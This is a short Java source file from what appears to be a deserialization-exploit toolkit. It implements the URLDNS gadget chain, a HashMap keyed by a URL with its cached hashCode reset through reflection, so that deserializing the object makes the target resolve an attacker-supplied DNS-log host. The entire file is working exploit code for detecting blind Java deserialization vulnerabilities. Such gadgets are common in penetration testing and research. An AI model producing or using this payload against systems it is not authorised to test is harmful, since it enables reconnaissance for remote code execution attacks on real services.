package com.chave.gadget.chain;

import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static Object getObject(String dnslog) throws MalformedURLException, IllegalAccessException, NoSuchFieldException {
        URL url = new URL("http://" + dnslog);
        HashMap hashMap = new HashMap();
        Field hashCodeField = URL.class.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url, 1);
        hashMap.put(url, "1");
        hashCodeField.set(url, -1);

        return hashMap;
    }
}
